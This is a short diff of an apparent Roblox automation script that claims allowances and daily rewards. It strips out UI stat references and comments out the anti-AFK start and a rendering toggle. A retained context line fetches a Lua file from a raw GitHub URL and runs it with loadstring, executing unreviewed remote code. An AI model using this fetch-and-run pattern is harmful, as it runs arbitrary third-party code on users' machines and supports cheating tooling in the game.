@@ -69,21 +69,6 @@ local allowanceTimer = allowanceTimerPath.Value
 local allowanceReady = false
 local claimedAllowancesCount = 0
 
-local stats = playerGui:
-            WaitForChild("CoreGUI"):
-            WaitForChild("StatsFrame"):
-            WaitForChild("Frame2"):
-            WaitForChild("Frame"):
-            WaitForChild("Container")
-local cashUI = stats:WaitForChild("Cash"):WaitForChild("Amt")
-local bankUI = stats:WaitForChild("Bank"):WaitForChild("Amt")
-
-local levelFrame = playerGui:
-            WaitForChild("CoreGUI"):
-            WaitForChild("LevelFrame")
-local xpUI = levelFrame:WaitForChild("Bar"):WaitForChild("Stat")
-local levelUI = levelFrame:WaitForChild("LevelBox"):WaitForChild("LevelNumber")
-
 local success, response = pcall(function()
     local dailyRewardsClaim = playerGui:
                             FindFirstChild("DailyLoginGUI"):
@@ -299,6 +284,6 @@ local function initAntiAFK()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/gatmeister-c/dextermorgan/main/balls.lua"))()
 end
 
-RunService:Set3dRenderingEnabled(false)
+--RunService:Set3dRenderingEnabled(false)
 task.spawn(main)
-task.spawn(initAntiAFK)
+--task.spawn(initAntiAFK)
